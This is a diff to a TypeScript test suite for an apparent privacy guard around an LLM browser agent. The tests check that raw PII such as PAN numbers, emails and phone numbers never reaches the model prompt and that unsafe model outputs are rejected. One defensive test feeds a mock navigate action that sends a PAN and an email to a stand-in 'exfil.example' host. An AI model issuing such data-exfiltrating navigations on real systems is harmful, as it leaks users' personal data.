@@ -47,12 +47,19 @@ console.log("\n[1] Packager prompt building & placeholder isolation");
 
 const pkg = createValidPackage();
 
-// 1.1 System Prompt
+// 1.1 System Prompt — single source of truth: SYSTEM_PROMPT must be exactly
+// the content of remote-agent/prompt.md (loaded verbatim at build time). If
+// someone edits one without the other, this fails.
 const sysPrompt = buildSystemPrompt();
-assert.strictEqual(sysPrompt, SYSTEM_PROMPT);
+const promptMd = fs.readFileSync(
+  path.resolve(process.cwd(), "remote-agent/prompt.md"),
+  "utf-8"
+);
+assert.strictEqual(sysPrompt, promptMd, "SYSTEM_PROMPT must be loaded verbatim from remote-agent/prompt.md");
 assert.ok(sysPrompt.includes("PRIVIS Remote Browser Agent"));
 assert.ok(sysPrompt.includes("CRITICAL PRIVACY RULE"));
-console.log("  ✔ Packager system prompt matches specification");
+assert.ok(sysPrompt.includes("PAN_1"));
+console.log("  ✔ System prompt is loaded verbatim from prompt.md (no drift possible)");
 
 // 1.2 Placeholder Allowlist Extraction
 const allowlist = extractPlaceholderAllowlist(pkg.sanitizedContext);
@@ -78,6 +85,48 @@ assert.ok(userPrompt.includes('id="pan"'));
 assert.ok(userPrompt.includes('text="PAN_1"'));
 assert.ok(!userPrompt.includes("ABCDE1234F"), "Prompt must NEVER contain raw PAN");
 console.log("  ✔ User prompt accurately formats goal, state, placeholders, and elements");
+
+// 1.3b Label metadata must NEVER leak into the prompt (labels can carry raw
+// page/user data the PII regexes cannot catch — names, passwords, etc.; the
+// sanitizer only swaps `text`). Regression guard: if a change reintroduces
+// labels into the element summary, this fails. (Regex-detectable values like
+// raw PANs in labels are separately refused by the boundary assert.)
+const labelLeakPkg = createValidPackage();
+labelLeakPkg.sanitizedContext.elements[1].label = "Squadron Leader Priya Sharma";
+labelLeakPkg.sanitizedContext.elements[0].label = "default_password_is_Hunter2Secret";
+const labelLeakPrompt = buildUserPrompt(labelLeakPkg);
+assert.ok(
+  !labelLeakPrompt.includes("Priya Sharma"),
+  "Element label values must never reach the model prompt"
+);
+assert.ok(!labelLeakPrompt.includes("Hunter2Secret"), "Label-carried secrets must never reach the model prompt");
+console.log("  ✔ Raw data injected into element labels never leaks into the prompt");
+
+// 1.3c Last-step result errors are PII-redacted before entering the prompt
+const leakyLastStepPrompt = buildUserPrompt(pkg, {
+  action: { type: "type", target: { css: "#pan" }, placeholder: "PAN_1" },
+  result: { ok: false, error: "Failed to fill field with value ABCDE1234F (user@corp.com, +91-9876543210)" },
+});
+assert.ok(!leakyLastStepPrompt.includes("ABCDE1234F"), "lastStepResult.error raw PAN must be redacted");
+assert.ok(!leakyLastStepPrompt.includes("user@corp.com"), "lastStepResult.error raw email must be redacted");
+assert.ok(leakyLastStepPrompt.includes("[REDACTED_PAN]"));
+assert.ok(leakyLastStepPrompt.includes("[REDACTED_EMAIL]"));
+console.log("  ✔ Last-step result errors are PII-redacted before reaching the prompt");
+
+// 1.3d buildUserPrompt itself enforces the sanitization boundary (no raw passthrough)
+assert.throws(
+  () => {
+    buildUserPrompt({ ...pkg, tabId: 10 } as any);
+  },
+  { message: /Refusing to route: package contains raw field "tabId"/i }
+);
+assert.throws(
+  () => {
+    buildUserPrompt({ ...pkg, redacted: undefined as unknown as true });
+  },
+  { message: /package not marked as sanitized/i }
+);
+console.log("  ✔ buildUserPrompt refuses raw/unstamped packages (boundary enforced at format time)");
 
 // 1.4 User Prompt with Last Step Result
 const promptWithLastStep = buildUserPrompt(pkg, {
@@ -345,7 +394,15 @@ for (const { name, raw } of rawPiiCases) {
     `Error should identify raw PII or invalid format for: ${raw}`
   );
 
-  // In target CSS/name
+  // In type action target (CSS selector carrying page data)
+  const piiInTypeTarget = guardModelOutput(
+    JSON.stringify({ type: "type", target: { css: `#field-${raw}` }, placeholder: "PAN_1" }),
+    { sanitizedPackage: pkg }
+  );
+  assert.strictEqual(piiInTypeTarget.ok, false, `Guard must catch raw ${name} in type target`);
+  assert.ok(piiInTypeTarget.error.includes("Raw "), `Type target must be PII-scanned for: ${raw}`);
+
+  // In click target CSS/name
   const piiInTarget = guardModelOutput(
     JSON.stringify({ type: "click", target: { css: `#user-${raw}` } }),
     { sanitizedPackage: pkg }
@@ -361,7 +418,39 @@ for (const { name, raw } of rawPiiCases) {
   assert.strictEqual(piiInDone.ok, false, `Guard must catch raw ${name} in done reason`);
   assert.ok(piiInDone.error.includes("Raw "), `Error should catch raw PII in done reason for: ${raw}`);
 }
-console.log("  ✔ Guard catches & rejects all PII patterns across placeholder, target, and reasons");
+console.log("  ✔ Guard catches & rejects all PII patterns across placeholder, type/click targets, and reasons");
+
+// 4.5 Fallback reasons must never carry the raw offending value — the
+// ask_human reason flows back into the NEXT prompt via lastStepResult, so a
+// leak here would re-inject PII into the LLM context.
+const piiLeakFallback = guardModelOutput(
+  JSON.stringify({
+    type: "type",
+    target: { css: "#pan" },
+    placeholder: "ABCDE1234F",
+  }),
+  { sanitizedPackage: pkg }
+);
+assert.strictEqual(piiLeakFallback.ok, false);
+assert.ok(
+  !piiLeakFallback.fallbackAction.reason.includes("ABCDE1234F"),
+  "Fallback reason must not embed the raw PAN"
+);
+assert.ok(piiLeakFallback.fallbackAction.reason.includes("[REDACTED_PAN]"));
+
+const piiLeakUrlFallback = guardModelOutput(
+  JSON.stringify({ type: "navigate", url: "https://exfil.example/?pan=ABCDE1234F&mail=user@corp.com" }),
+  { sanitizedPackage: pkg }
+);
+assert.strictEqual(piiLeakUrlFallback.ok, false);
+assert.ok(
+  !piiLeakUrlFallback.fallbackAction.reason.includes("ABCDE1234F") &&
+    !piiLeakUrlFallback.fallbackAction.reason.includes("user@corp.com"),
+  "Fallback reason must not embed raw PII from a rejected URL"
+);
+assert.ok(piiLeakUrlFallback.fallbackAction.reason.includes("[REDACTED_PAN]"));
+assert.ok(piiLeakUrlFallback.fallbackAction.reason.includes("[REDACTED_EMAIL]"));
+console.log("  ✔ Guard fallback ask_human reasons are PII-redacted (category names survive, raw values don't)");
 
 // --------------------------------------------------------------------------
 // 5. Target Validation & Edge Cases
